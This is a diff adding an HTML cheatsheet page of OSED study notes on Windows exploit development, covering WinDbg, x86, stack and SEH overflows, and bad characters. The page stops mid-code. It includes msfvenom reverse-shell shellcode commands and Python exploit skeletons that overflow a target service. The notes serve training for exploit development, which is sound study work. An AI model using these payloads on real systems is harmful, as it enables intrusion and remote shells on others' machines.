@@ -1,0 +1,1460 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>OSED | Cheatsheet</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/osed_icon.svg" rel="icon">
+  <link href="./img/osed_icon.svg" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="./vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="./vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="./vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="OSED Cheatsheet">
+  <meta property="og:description" content="Windows user-mode exploit development notes for OSED / EXP-301.">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./osed.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="OSED Cheatsheet">
+  <meta name="twitter:description" content="Windows user-mode exploit development notes for OSED / EXP-301.">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (light -> medium, readable with dark text) */
+  .section-flow-1{background-color:#fce8e8;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#fce8e8;}
+  .section-flow-2{background-color:#f9e1e1;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#f9e1e1;}
+  .section-flow-3{background-color:#f5dada;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#f5dada;}
+  .section-flow-4{background-color:#f2d3d3;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#f2d3d3;}
+  .section-flow-5{background-color:#eecdcd;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#eecdcd;}
+  .section-flow-6{background-color:#ebc6c6;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#ebc6c6;}
+  .section-flow-7{background-color:#e7bfbf;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#e7bfbf;}
+  .section-flow-8{background-color:#e4b8b8;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#e4b8b8;}
+  .section-flow-9{background-color:#e0b1b1;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#e0b1b1;}
+  .section-flow-10{background-color:#ddaaaa;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#ddaaaa;}
+  .section-flow-11{background-color:#d9a4a4;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#d9a4a4;}
+  .section-flow-12{background-color:#d69d9d;}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#d69d9d;}
+  .section-flow-13{background-color:#d29696;}
+  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:#d29696;}
+  .section-flow-14{background-color:#cf8f8f;}
+  .section-flow-14 .dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:#cf8f8f;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="./resume.html" class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i><span>Resume</span></a></li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Cheatsheets <span class="arrow">▼</span></a>
+            <ul id="submenu" class="submenu open">
+              <li><a href="./ejpt.html" class="nav-link scrollto"><img src="./img/ejpt.png" alt="eJPT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">eJPT</a></li>
+              <li><a href="./oswp.html" class="nav-link scrollto"><img src="./img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP+ Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto active"><img src="./img/osed_icon.svg" alt="OSED Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/osai_icon.svg" alt="OSAI Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSAI <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crto_icon.png" alt="CRTO Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTO <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crtl_icon.png" alt="CRTL Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTL <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>OSED Cheatsheet</h2>
+          <p class="text-muted small">Latest update: June, 2026</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>OSED Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <div class="cheatsheet-content">
+
+              <h2 id="osed-tools-setup">1. Tools &amp; Setup</h2>
+              <p>The Windows user-mode exploit development workflow runs against a 32-bit Windows 10 VM with DEP and ASLR enabled, debugged from WinDbg scripted with pykd, and reverse-engineered in IDA Pro or Ghidra. Keep a Kali VM alongside for <code>msfvenom</code>, pattern tools, and listeners.</p>
+              <h3 id="osed-lab-setup">1.1 Lab &amp; Debugger Setup</h3>
+              <p>Install the Windows SDK (Debugging Tools for Windows) for WinDbg, set the symbol path to Microsoft&rsquo;s server so stack traces resolve, and load <strong>pykd</strong> for Python-scripted analysis. Do <em>not</em> disable DEP/ASLR &mdash; the exam targets have them on and you must defeat them in place.</p>
+              <pre><code class="language-powershell"># Set Microsoft symbol server, reload all symbols
+.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
+.reload /f
+
+# Load pykd extension, run a script
+.load pykd
+!py C:\Tools\script.py
+
+# Show all loaded modules with base addresses
+lm
+
+# List symbols matching a pattern
+x kernel32!Virtual*</code></pre>
+              <h3 id="osed-tool-table">1.2 Tool Reference</h3>
+              <table class="custom-table">
+                <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+                <tbody>
+                  <tr><td>WinDbg + pykd</td><td>Primary debugger; pykd automates gadget search, bad-char compare, ROP chain building</td></tr>
+                  <tr><td>IDA Pro</td><td>Static reverse engineering; synchronize with WinDbg for dynamic analysis</td></tr>
+                  <tr><td>Ghidra</td><td>Free NSA static RE tool; decompiler + disassembler, scriptable in Java/Python</td></tr>
+                  <tr><td>nasm / keystone</td><td>Assemble shellcode / single instructions to raw opcodes</td></tr>
+                  <tr><td>msf-pattern_create / _offset</td><td>De Bruijn cyclic pattern to locate EIP/SEH offset precisely</td></tr>
+                  <tr><td>msf-nasm_shell</td><td>Interactive assembly &rarr; opcodes (e.g. <code>jmp esp</code> &rarr; <code>FF E4</code>)</td></tr>
+                  <tr><td>msfvenom</td><td>Generate shellcode with encoder and bad-char exclusion</td></tr>
+                  <tr><td>RP++</td><td>Fast ROP gadget enumeration from module binaries</td></tr>
+                  <tr><td>ropper</td><td>ROP gadget finder with search and filter capabilities</td></tr>
+                  <tr><td>mona.py</td><td>All-in-one helper: pattern, bytearray, modules, jmp, rop chains</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-bash"># Cyclic pattern: generate, crash target, then find offset
+msf-pattern_create -l 2000 &gt; pattern.txt
+msf-pattern_offset -l 2000 -q 42306142    # value seen in EIP -&gt; exact offset
+
+# Assembly -&gt; opcode (interactive)
+msf-nasm_shell
+nasm &gt; jmp esp         # =&gt; FF E4
+nasm &gt; pop eax; ret    # =&gt; 58 C3
+
+# Shellcode: reverse shell, shikata encoded, no null/CR/LF
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 \
+  -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
+# Keystone: assemble shellcode inline from Python
+python3 -c "
+from keystone import *
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+code, count = ks.asm('xor eax,eax; push eax; push 0x636c6163; mov ebx,esp')
+print(''.join(f'\\\\x{b:02x}' for b in code))
+"</code></pre>
+
+              <h2 id="osed-x86">2. x86 Architecture</h2>
+              <p>32-bit x86 is the entire scope of OSED. You need the memory layout, the register set, the calling conventions, and a small instruction vocabulary to read disassembly, reason about overflows, and write shellcode.</p>
+              <h3 id="osed-memory-layout">2.1 Program Memory Layout</h3>
+              <p>A process splits into a <strong>text</strong> segment (executable, read+execute only), <strong>data/BSS</strong> for globals/statics (initialized and uninitialized), a <strong>heap</strong> for dynamic allocations growing upward, and a <strong>stack</strong> for locals, saved frame pointers, return addresses, and function arguments &mdash; growing <em>downward</em> from high to low addresses.</p>
+              <h3 id="osed-registers">2.2 CPU Registers</h3>
+              <p>Hijacking <strong>EIP</strong> is the entire point of exploitation; the other registers shape how you get there and what your shellcode can do.</p>
+              <table class="custom-table">
+                <thead><tr><th>Register</th><th>Role in Exploitation</th></tr></thead>
+                <tbody>
+                  <tr><td>EIP</td><td>Instruction pointer &mdash; address of next instruction; <strong>hijacking this = code execution</strong></td></tr>
+                  <tr><td>ESP</td><td>Stack pointer (top of stack, lowest addr); shellcode lives here after overflow</td></tr>
+                  <tr><td>EBP</td><td>Frame base pointer; offset arithmetic used to find EIP offset</td></tr>
+                  <tr><td>EAX</td><td>Accumulator; holds return values; ROP gadget for API argument passing</td></tr>
+                  <tr><td>EBX / ECX / EDX</td><td>General purpose; ECX often loop counter, EDX I/O; used in ROP chains</td></tr>
+                  <tr><td>ESI / EDI</td><td>Source/destination index; egghunter uses ESI/EDI to scan memory</td></tr>
+                  <tr><td>EFLAGS</td><td>ZF, CF, OF drive conditional jumps in shellcode and ROP chains</td></tr>
+                </tbody>
+              </table>
+              <h3 id="osed-stack">2.3 The Stack &amp; Calling Conventions</h3>
+              <p>The stack grows high &rarr; low; <code>PUSH</code> decrements ESP by 4 and writes, <code>POP</code> reads and increments ESP by 4. <strong>stdcall</strong> (Win32 APIs) pushes arguments right-to-left, returns in EAX, and the <em>callee</em> cleans the stack with <code>RETN N</code>. <strong>cdecl</strong> (C runtime) makes the caller clean via <code>ADD ESP, N</code> after the call. A <code>CALL</code> pushes the return address (EIP + instruction size); <code>RET</code> pops it back into EIP &mdash; that&rsquo;s the value a stack overflow overwrites. All values are <strong>little-endian</strong>: the address <code>0x10090c83</code> is written in memory as <code>\x83\x0c\x09\x10</code>.</p>
+              <h3 id="osed-instructions">2.4 Common Instructions</h3>
+              <pre><code class="language-nasm">mov  eax, ebx        ; eax = ebx
+xor  eax, eax        ; eax = 0  (null-byte-free zeroing)
+push eax             ; esp -= 4; [esp] = eax
+pop  ecx             ; ecx = [esp]; esp += 4
+call eax             ; [esp] = eip+2; jmp eax
+jmp  esp             ; jump to address in ESP (classic redirect after EIP overwrite)
+ret                  ; pop eip  (ROP "glue")
+retn 4               ; pop eip; esp += 4  (stdcall cleanup)
+add  esp, 0x10       ; stack pivot / cleanup
+sub  esp, 0x40       ; make space for shellcode (avoid overwriting)
+int  0x2e            ; legacy Windows syscall gate (used in egghunters)
+lea  eax, [ebp-0x8]  ; load effective address (no memory read)
+test eax, eax        ; set ZF if eax=0 (non-destructive check)
+jnz  label           ; jump if ZF=0 (conditional jump in shellcode)</code></pre>
+
+              <h2 id="osed-windbg">3. Debugging</h2>
+              <p>WinDbg is the primary lens into the running target. Use it to control execution, inspect memory and registers, search for gadgets, and script analysis with pykd.</p>
+              <h3 id="osed-windbg-nav">3.1 Navigation &amp; Execution Control</h3>
+              <pre><code class="language-powershell">g               # go / continue execution
+g 0x10001234    # run until address
+t               # trace-into one instruction (steps into CALL)
+p               # step-over one instruction (executes CALL fully)
+pt              # step to next RET
+gu              # go up: run until current function returns
+pc              # step to next CALL
+.restart        # restart the target (clean slate without reattach)
+q               # quit debugger</code></pre>
+              <h3 id="osed-windbg-bp">3.2 Breakpoints &amp; Actions</h3>
+              <p>Software breakpoints by address or symbol cover most of the work; pair them with WinDbg actions to log values and continue without breaking the flow.</p>
+              <pre><code class="language-powershell">bp 0x00401000            # software INT3 breakpoint at address
+bp module!function       # break on symbol (e.g. bp ws2_32!recv)
+bu ws2_32!recv           # unresolved breakpoint: set before DLL loads
+bm sync*!*recv*          # wildcard breakpoint across matching symbols
+bl                       # list all breakpoints with their IDs
+bc *                     # clear all breakpoints
+bd 0 / be 0              # disable / enable breakpoint 0
+
+# Breakpoint-based action: run a command when the BP fires
+bp ws2_32!recv "dd esp L8; g"            # dump 8 stack dwords then continue
+bp ws2_32!recv "r ecx; .echo 'recv hit'; g"  # log ECX then continue
+# Log the recv buffer to a file every hit:
+bp ws2_32!recv ".logopen C:\\recv.log; da poi(esp+8); .logclose; g"</code></pre>
+              <h3 id="osed-windbg-hw">3.3 Hardware Breakpoints</h3>
+              <p>Hardware breakpoints survive VirtualProtect and work on execute-only or ROM pages, making them ideal for taint-tracking a buffer through every instruction that modifies it.</p>
+              <pre><code class="language-powershell">ba w4 0x0012fc00     # break on 4-byte WRITE to address (watch for EIP overwrite)
+ba r1 0x0041a3b0     # break on 1-byte READ of address
+ba e1 0x004015c0     # break on EXECUTE at address (no INT3 modification)
+# Use to taint-track a buffer: set write-watch at the buffer start, then trace
+# every instruction that modifies it.</code></pre>
+              <h3 id="osed-windbg-mem">3.4 Accessing &amp; Manipulating Memory</h3>
+              <pre><code class="language-powershell">u eip              # unassemble forward from EIP
+u eip L20          # unassemble 0x20 instructions
+db &lt;addr&gt; L100     # display bytes (hex + ASCII)
+dw &lt;addr&gt; L40      # display words (16-bit)
+dd &lt;addr&gt; L40      # display dwords (32-bit)
+dq &lt;addr&gt; L20      # display qwords (64-bit)
+dc &lt;addr&gt;          # dwords + ASCII side-by-side
+da &lt;addr&gt;          # display null-terminated ASCII string
+du &lt;addr&gt;          # display null-terminated Unicode string
+dds esp L20        # dump stack as dwords, resolving symbols (great for tracing ROP)
+dt _LIST_ENTRY 0x12f000   # dump structure overlay at address
+!teb / !peb        # dump Thread/Process Environment Block
+!address &lt;addr&gt;    # page permissions at address (is it executable?)
+!exchain           # walk the SEH chain
+
+# Write memory
+eb 0x00401000 90 90 90   # write 3 NOPs (bytes)
+ed 0x00401000 90909090   # write one DWORD
+ew &lt;addr&gt; 9090            # write word</code></pre>
+              <h3 id="osed-windbg-search">3.5 Searching Memory</h3>
+              <pre><code class="language-powershell"># Find JMP ESP (FF E4) anywhere in mapped memory
+s -b 0 L?80000000 ff e4
+
+# Find POP r32/POP r32/RET (5? 5? c3) for SEH exploitation
+s -[1]b 0 L?80000000 5? 5? c3
+
+# Find CALL ESP (FF D4) or PUSH ESP/RET (54 c3)
+s -b 0 L?80000000 ff d4
+s -b 0 L?80000000 54 c3
+
+# Search ASCII string in memory
+s -a 0 L?80000000 "w00t"
+
+# Limit search to a specific module range (faster)
+s -b &lt;base&gt; &lt;base+size&gt; ff e4
+
+# Find a sequence of bytes (e.g. XCHG EAX,ESP; RET -- stack pivot)
+s -b 0 L?80000000 94 c3</code></pre>
+              <h3 id="osed-windbg-calc">3.6 Registers &amp; Calculator</h3>
+              <pre><code class="language-powershell">r                  # all general-purpose registers
+r eip              # just EIP
+r eax=0x41414141   # set EAX to a value
+? 0x10090c83 - 0x10000000     # evaluate expression (hex arithmetic)
+? poi(esp)         # dereference: value at [ESP]
+? poi(poi(esp+4))  # double-dereference
+.formats 0xff e4   # show all numeric representations of a value
+.echo "hello"      # print a string (useful in scripts/actions)</code></pre>
+              <h3 id="osed-windbg-modules">3.7 Listing Modules &amp; Symbols</h3>
+              <pre><code class="language-powershell">lm                        # list all loaded modules + base/end addresses
+lm m kernel32             # filter to kernel32
+lmf m sync*               # show image file paths
+x kernel32!VirtualAlloc   # resolve symbol to address
+x ntdll!*Ldr*             # wildcard symbol lookup
+!sym noisy                # verbose symbol loading (diagnose missing symbols)
+.reload /f kernel32       # force reload symbols for a module</code></pre>
+              <h3 id="osed-windbg-pseudo">3.8 Pseudo Registers</h3>
+              <p>Pseudo registers <code>$t0</code>&ndash;<code>$t19</code> act as temporary variables inside WinDbg scripts; <code>$exentry</code> is the executable&rsquo;s entry point.</p>
+              <pre><code class="language-powershell"># Pseudo registers: temporary variables in WinDbg scripts
+r $t0 = poi(esp)           # store dereference into $t0
+r $t1 = $t0 + 0x10         # arithmetic
+? $t1
+
+# $exentry: entry point of the executable
+bp $exentry               # break at program entry point
+
+# Repeat a command for a range (log 20 CALL sites from EIP)
+.for (r $t0 = 0; @$t0 &lt; 20; r $t0 = @$t0 + 1) { t; u eip L1 }
+
+# Common one-liner: log recv() buffer each hit and continue
+bp ws2_32!recv "r; da poi(esp+8) L?100; g"</code></pre>
+              <h3 id="osed-windbg-pykd">3.9 pykd Scripting</h3>
+              <p>pykd exposes WinDbg primitives to Python, letting you automate gadget search, bad-char comparison, and ROP-chain construction.</p>
+              <pre><code class="language-python"># Run from WinDbg:  !py C:\Tools\script.py
+import pykd
+
+# Read registers
+eip = pykd.reg("eip")
+esp = pykd.reg("esp")
+print(f"EIP=0x{eip:08x}  ESP=0x{esp:08x}")
+
+# Read memory: 16 dwords from the stack
+for i in range(16):
+    val = pykd.loadDWords(esp + i*4, 1)[0]
+    sym = ""
+    try: sym = pykd.findSymbol(val)
+    except: pass
+    print(f"  esp+{i*4:#04x}: 0x{val:08x}  {sym}")
+
+# Search memory for JMP ESP (ff e4) gadgets
+start, end = 0x10000000, 0x10100000
+for addr in range(start, end-1):
+    if pykd.loadBytes(addr, 2) == [0xff, 0xe4]:
+        try:
+            sym = pykd.findSymbol(addr)
+        except:
+            sym = "?"
+        print(f"JMP ESP @ 0x{addr:08x}  [{sym}]")</code></pre>
+
+
+              <h2 id="osed-stack-overflow">4. Stack Buffer Overflows</h2>
+              <p>The canonical Windows exploitation primitive: overflow a stack buffer to overwrite the saved return address, redirect EIP to a <code>JMP ESP</code> in a non-ASLR module, and land on shellcode that follows it on the stack.</p>
+              <h3 id="osed-stack-theory">4.1 Theory</h3>
+              <p>A stack buffer overflow overwrites the <strong>saved return address</strong> pushed by <code>CALL</code> and consumed by <code>RET</code>. When the function executes <code>RET</code>, EIP becomes your value. Point it at a <code>JMP ESP</code> gadget in a non-ASLR module and your shellcode &mdash; sitting right after EIP on the stack &mdash; executes.</p>
+              <h3 id="osed-stack-steps">4.2 Step-by-Step Workflow</h3>
+              <p>Crash the target with progressively larger inputs (attach WinDbg first to capture the fault state) until EIP reads <code>41414141</code>. Send a <code>msf-pattern_create</code> buffer, read EIP, and resolve the offset with <code>msf-pattern_offset</code>. Confirm precise control by sending <code>A*offset + B*4</code> &mdash; EIP must read <code>42424242</code> exactly. Inspect <code>db esp L8</code> to see what follows. Count contiguous bytes after ESP until a null or buffer end to measure shellcode space; under ~400 bytes, plan for an egghunter (&sect;8). Then enumerate bad characters (&sect;5) and pick a return address (&sect;5.5). Finally stage NOP sled + shellcode after EIP.</p>
+              <h3 id="osed-stack-space">4.3 Locating Shellcode Space</h3>
+              <pre><code class="language-powershell"># After crash: see what ESP points to and how much room follows
+db esp L200        # display 0x200 bytes from ESP
+# Count contiguous "41"s (your A-s replaced by shellcode) after EIP
+
+# If space is before the EIP overwrite (in your A-buffer):
+# Put shellcode BEFORE the offset, then jump backward to it.
+# Sub-esp / add-esp trick to avoid crashing shellcode during stack ops:
+# Prepend "\x83\xec\x10" (sub esp,0x10) before shellcode if needed.</code></pre>
+              <h3 id="osed-stack-skeleton">4.4 Exploit Skeleton</h3>
+              <pre><code class="language-python">import socket, struct
+
+TARGET  = "192.168.X.Y"
+PORT    = 9999
+OFFSET  = 780
+JMP_ESP = struct.pack("&lt;I", 0x10090c83)  # JMP ESP from non-ASLR module, no bad chars
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443
+#   -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+shellcode = b""  # paste generated shellcode bytes here
+
+nops = b"\x90" * 16    # small NOP sled for reliability
+
+buf  = b"A" * OFFSET
+buf += JMP_ESP
+buf += nops
+buf += shellcode
+
+with socket.create_connection((TARGET, PORT)) as s:
+    s.send(buf + b"\r\n")</code></pre>
+
+              <h2 id="osed-bad-chars">5. Bad Characters &amp; Return Addresses</h2>
+              <p>Bad characters are bytes the application transforms or truncates before they reach memory; the return address you pick must come from a module without ASLR (and, for SEH, without SafeSEH) and contain none of those bad bytes.</p>
+              <h3 id="osed-bad-chars-find">5.1 Finding Bad Characters</h3>
+              <p>Send every byte from <code>\x01</code> through <code>\xff</code> after your EIP overwrite, then compare memory against the expected sequence. Where the sequence breaks or skips, that byte is bad. One bad char can mask the next, so remove confirmed bad bytes and repeat until the full array lands clean. Usual suspects: <code>\x00</code> (null), <code>\x0a</code> (LF), <code>\x0d</code> (CR); protocol-specific: <code>\x20</code> (space), <code>\x26</code> (<code>&amp;</code>), <code>\x3d</code> (<code>=</code>).</p>
+              <pre><code class="language-python"># Generate \x01..\xff test array
+badchars = bytes(range(1, 256))   # exclude \x00 (always bad)
+buf = b"A" * OFFSET + JMP_ESP + badchars
+# Send, then inspect the region starting at ESP:</code></pre>
+              <pre><code class="language-powershell"># WinDbg: compare memory against the expected sequence
+db esp L100
+# Where the byte sequence breaks or changes -&gt; that byte is bad
+# Remove it and repeat until the full sequence lands clean.
+
+# mona helper: generate a comparison file, then diff against memory
+!py mona bytearray -b "\x00"               # write bytearray without \x00
+!py mona compare -f C:\mona\bytearray.bin -a esp  # compare memory to file</code></pre>
+              <h3 id="osed-return-address">5.2 Finding a Return Address (JMP ESP)</h3>
+              <p>You need an address that redirects to where your shellcode sits. If shellcode is at ESP, use <code>JMP ESP</code> / <code>CALL ESP</code> / <code>PUSH ESP; RET</code>; if a different register points near your buffer, use the matching jump (<code>JMP EAX</code>, etc.). Source it from a module without ASLR, and verify the address bytes contain no bad chars.</p>
+              <pre><code class="language-powershell"># Get the opcode for any redirect: msf-nasm_shell -&gt; jmp esp = FF E4
+# Search loaded module memory for JMP ESP
+lm                                  # list modules; pick one without ASLR
+s -b &lt;base&gt; &lt;base+size&gt; ff e4       # search within that module
+
+# Or search all mapped memory (slower)
+s -b 0 L?80000000 ff e4
+# Filter by: no bad chars in address, module has ASLR=False</code></pre>
+              <h3 id="osed-module-protections">5.3 Module Protection Flags</h3>
+              <p>The address must come from a module that is <strong>not</strong> rebased by ASLR (and, for SEH, <strong>not</strong> SafeSEH), and must contain no bad-char bytes. mona&rsquo;s <code>modules</code> command tabulates ASLR / SafeSEH / Rebase / NXCompat per module so you can pick a candidate quickly.</p>
+              <pre><code class="language-powershell">!py mona modules    # table: ASLR / SafeSEH / Rebase / NXCompat / OS per module
+lm                  # compare base addresses across reboots to confirm ASLR on/off
+# Goal: ASLR=False (and SafeSEH=False for SEH exploits)
+# Also: address bytes must avoid all identified bad chars</code></pre>
+
+              <h2 id="osed-seh-overflow">6. SEH-Based Overflows</h2>
+              <p>When the overflow tramples a stack-resident <strong>exception registration record</strong> instead of a saved return address, you exploit it by overwriting the handler pointer so the exception dispatcher transfers control to a gadget of your choice.</p>
+              <h3 id="osed-seh-theory">6.1 Structured Exception Handling Theory</h3>
+              <p>Windows maintains a singly-linked list of exception registration records on the stack. Each record is two 4-byte fields: <code>nSEH</code> (pointer to the next record) and <code>SEH</code> (pointer to the handler function). When an exception fires, the OS dispatcher walks this chain, calling each handler. A large overflow can overwrite one of these records; the overflow itself typically triggers an access violation, which hands control to the dispatcher with your overwritten handler pointer. Modern Windows enforces SEH validation: <strong>SafeSEH</strong> checks a per-module exception handler table, and <strong>SEHOP</strong> verifies the chain terminates at a known sentinel.</p>
+              <h3 id="osed-seh-bypass">6.2 Bypassing SafeSEH / SEHOP</h3>
+              <p>Source your <code>POP/POP/RET</code> gadget from a module compiled without SafeSEH (<code>SafeSEH=False</code> in mona&rsquo;s table). For SEHOP, ensure the chain still terminates correctly; Windows 7 is largely silent, Windows 10 is more restrictive &mdash; find a module without SEHOP enforcement and prefer it.</p>
+              <h3 id="osed-seh-steps">6.3 Exploitation Steps</h3>
+              <p>Overflow to overwrite the SEH record &mdash; the overflow itself triggers an access violation. Set <strong>SEH</strong> (handler pointer) to a <code>POP r32 / POP r32 / RET</code> gadget from a SafeSEH-free module: the two POPs skip the &ldquo;extra&rdquo; items the dispatcher pushes, and <code>RET</code> returns into <code>nSEH</code>. Set <strong>nSEH</strong> to a short jump forward (<code>\xeb\x06\x90\x90</code> = <code>JMP +6</code>, padded with NOPs) to hop over the SEH field into your shellcode. Find the offset to the SEH record with a cyclic pattern and confirm with <code>!exchain</code>.</p>
+              <pre><code class="language-powershell"># After crash: inspect the SEH chain to confirm your overwrite
+!exchain
+# Should show: 0xXXXXXXXX: invalid (your pattern value) -&gt; that is the SEH handler
+
+# Find a POP POP RET in a SafeSEH-free module
+!py mona seh -b "\x00\x0a\x0d"
+# Or search manually for 5? 5? c3
+s -[1]b 0 L?80000000 5? 5? c3</code></pre>
+              <h3 id="osed-seh-island">6.4 Island-Hopping in Assembly</h3>
+              <p>After <code>nSEH</code> short-jumps into the buffer, you may have only a small window before the next SEH record or EIP alignment eats your space. Chain short jumps to hop between &ldquo;islands&rdquo; of usable space throughout the buffer &mdash; a 2-byte short JMP can reach &plusmn;127 bytes, and a 5-byte near JMP reaches &plusmn;2&nbsp;GB.</p>
+              <pre><code class="language-python"># Short jump: 2 bytes, range +-127 bytes relative to next instruction
+nseh_jmp = b"\xeb\x06\x90\x90"    # JMP +6 (hops over the 4-byte SEH field)
+
+# Near jump: 5 bytes, range +-2GB
+# If you need to jump backward into a large A-buffer:
+near_jmp_back = b"\xe9" + struct.pack("&lt;i", -300)  # JMP -300 (signed offset)
+
+# Pattern: [padding][nSEH=short jmp fwd][SEH=POP/POP/RET][NOP sled][shellcode]
+buf  = b"A" * offset_to_nseh
+buf += nseh_jmp         # nSEH: short jump forward
+buf += struct.pack("&lt;I", ppr_addr)   # SEH: POP POP RET
+buf += b"\x90" * 16
+buf += shellcode</code></pre>
+              <h3 id="osed-seh-layout">6.5 Full Exploit Layout</h3>
+              <pre><code class="language-python">import socket, struct
+
+TARGET  = "192.168.X.Y"
+PORT    = 9999
+OFFSET  = 524     # offset to nSEH (found with cyclic pattern + !exchain)
+PPR     = 0x10085f3a  # POP POP RET from non-SafeSEH module
+
+nseh = b"\xeb\x06\x90\x90"         # short jmp +6
+seh  = struct.pack("&lt;I", PPR)
+
